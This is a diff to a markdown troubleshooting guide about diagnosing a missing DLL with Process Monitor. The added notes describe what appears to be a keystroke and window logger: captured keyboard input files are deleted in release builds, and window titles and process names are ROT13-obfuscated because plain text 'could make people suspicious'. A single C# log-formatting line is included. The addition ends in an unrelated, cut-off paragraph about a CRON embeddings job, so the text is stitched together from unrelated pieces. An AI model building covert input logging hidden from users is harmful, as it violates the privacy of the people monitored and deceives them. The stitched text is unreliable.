@@ -195,3 +195,24 @@ A key tool used to diagnose the missing DLL issue was **Process Monitor** (`proc
       * Add the rule and apply the filter.
 3.  **Reproduce the crash:** Run your application. Process Monitor will now only capture events related to it.
 4.  **Analyze the log:** After the application crashes, stop capturing events (press `Ctrl+E`). Look through the log for operations with a `Result` of **`NAME NOT FOUND`**. This will show you exactly which file the application tried to load and failed to find, pinpointing the missing dependency (in our case, `VCRUNTIME140.dll` in various system paths).
+
+
+
+## Notes to make clear in the documentation:
+
+-c Release: DEBUG is false
+if DEBUG is true:
+- More logs
+- the actual keyboard input files aren#t deleted
+
+# ROT 13:
+- Mouse is not rot 13 cause can't understand shit anyways
+- Window is because it could make people suspicious
+  - string formattedLog = $"[{log.Timestamp:HH:mm:ss}] {log.WindowTitle.ToRot13()}|{log.WindowHandle}|{log.ProcessName.ToRot13()}";
+- Text is
+
+
+# Where exactly is the data stored and how does this work?
+- Where in the code is it defined and why? Because we need user specific permission there...
+
+Right now, we have a single CRON job that processes the embeddings at 12pm during night. This worked so far but we have new requirements. Now, we need to 
